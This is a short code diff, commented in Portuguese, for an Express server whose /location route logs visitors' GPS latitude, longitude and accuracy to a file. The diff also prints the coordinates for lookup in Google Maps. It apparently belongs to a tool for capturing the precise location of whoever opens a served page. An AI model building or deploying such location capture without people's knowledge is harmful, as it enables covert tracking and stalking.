@@ -15,13 +15,17 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Rota de Localização (GPS Real)
+// Rota de Localização (GPS Real) - ATUALIZADA
 app.post('/location', (req, res) => {
     const { lat, lon, acc } = req.body;
+    
+    // ESTA LINHA ABAIXO É A QUE VAI MOSTRAR OS NÚMEROS NO RENDER:
+    console.log(`📍 COORDENADAS PARA O GOOGLE MAPS: ${lat}, ${lon}`);
+
     const infoLoc = `[📍 GPS REAL] Lat: ${lat} | Lon: ${lon} | Precisão: ${acc}m | Data: ${new Date().toLocaleString('pt-BR')}\n`;
 
     fs.appendFile(logPath, infoLoc, (err) => {
-        if (!err) console.log("📍 GPS capturado e salvo.");
+        if (err) console.error("Erro ao salvar GPS:", err);
     });
     res.sendStatus(204);
 });
